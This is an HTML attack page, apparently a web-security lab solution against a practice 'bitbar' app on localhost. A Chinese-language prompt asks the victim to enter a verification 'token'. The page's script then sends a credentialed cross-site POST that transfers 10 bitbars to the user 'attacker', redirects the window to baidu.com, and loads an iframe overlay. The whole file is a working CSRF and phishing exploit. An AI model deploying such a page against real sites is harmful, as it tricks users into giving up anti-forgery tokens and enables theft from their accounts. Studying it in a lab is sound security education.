<!DOCTYPE html>
<html>

<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Stolen bitbar</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
  <script>
function gotEm() {
  var token = document.getElementById("token").value;
  var request = new XMLHttpRequest();
  request.open("POST", "http://localhost:3000/super_secure_post_transfer", false);
  request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  request.withCredentials = true;
  try {
    request.send("quantity=10&destination_username=attacker&tokeninput=" + token);
  } catch (err) {
    // Do nothing on inevitable XSS error
  } finally {
    window.top.location = "http://baidu.com";
  }
}
</script>

</head>

<body>
    <label for="token">请输入以下token验证身份: </label>
    <input type="text" , id="token">
    <button type="button" onclick="gotEm()">
        验证
    </button>
    <br />
    <iframe src="bp2.html" scrolling="no" class="iframe" frameborder="0"></iframe>
</body>

</html>
